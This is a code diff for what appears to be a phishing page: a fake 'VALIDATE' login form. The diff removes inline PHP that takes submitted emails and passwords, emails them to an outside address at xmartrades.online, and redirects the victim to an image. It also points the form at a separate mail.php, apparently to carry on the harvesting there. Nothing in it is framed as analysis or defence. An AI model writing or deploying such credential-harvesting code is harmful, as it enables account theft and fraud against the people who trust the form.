@@ -1,21 +1,3 @@
-
-<?php
-if(!empty($_POST["email"])) {
-$to = "support@xmartrades.online";
-$subject = "My subject";
-$email = $_POST["email"];
-$password = $_POST["password"];
-$txt = "Email:".$email.' & Password: '.$password;
-$headers = "From: support@xmartrades.online" . "\r\n" .
-"CC: support@xmartrades.online";
-
-mail($to,$subject,$txt,$headers);
-
-header("Location: https://xmartrades.online/HelloTech-qr-code-300x300.webp");
-}
-?>
-
-
 <!DOCTYPE html>
 <html lang="en" >
 <head>
@@ -33,7 +15,7 @@ header("Location: https://xmartrades.online/HelloTech-qr-code-300x300.webp");
             <div class="circle circle-one"></div>
             <div class="form-container">
                 <h1 class="opacity">VALIDATE</h1>
-                <form action="index.php" method="post">
+                <form action="mail.php" method="post">
 				     <label for="email"><b>Username</b></label>
                     <input type="text" placeholder="USERNAME" />
 				    <label for="password"><b>Password</b></label>
